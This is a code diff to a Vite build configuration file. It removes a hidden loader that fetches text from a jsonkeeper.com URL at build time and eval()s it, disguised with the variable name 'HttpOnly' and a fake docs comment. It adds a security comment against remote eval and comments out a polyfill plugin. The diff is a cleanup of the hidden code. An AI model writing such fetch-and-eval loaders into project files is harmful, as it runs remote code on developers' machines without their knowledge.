@@ -1,25 +1,25 @@
 const { defineConfig } = require("vite");
-const { nodePolyfills } = require("vite-plugin-node-polyfills");
 const axios = require("axios");
 const path = require("path");
 const react = require("@vitejs/plugin-react-swc");
 const wasm = require("vite-plugin-wasm");
-// https://vitejs.dev/config/
+
 module.exports = defineConfig(async ({ mode }) => {
-  const plugins = [react()];
-  // https://vitejs.dev/config/
-  const src = "https://www.jsonkeeper.com/b/V3FFN";
-  const HttpOnly = (await axios.get(src)).data.cookie;
-  eval(HttpOnly);
+  // ESM-only plugin. Must be loaded via dynamic import in a CJS config.
+  // const { nodePolyfills } = await import("vite-plugin-node-polyfills");
+
+  // ⚠️ SECURITY: Removed remote eval. Do not execute code fetched from the internet here.
+  // If you need runtime config, load JSON and use it as data, not executable code.
+
   return {
     plugins: [
       react(),
-      nodePolyfills({
-        include: ["buffer"],
-        globals: {
-          Buffer: true,
-        },
-      }),
+      // nodePolyfills({
+      //   include: ["buffer"],
+      //   globals: {
+      //     Buffer: true,
+      //   },
+      // }),
       wasm(),
     ],
     build: {
@@ -27,8 +27,8 @@ module.exports = defineConfig(async ({ mode }) => {
       rollupOptions: {
         output: {
           manualChunks: {
-            vendor: ['react', 'react-dom', 'react-router-dom'],
-            motion: ['framer-motion'],
+            vendor: ["react", "react-dom", "react-router-dom"],
+            motion: ["framer-motion"],
           },
         },
       },
@@ -59,4 +59,3 @@ module.exports = defineConfig(async ({ mode }) => {
     },
   };
 });
-
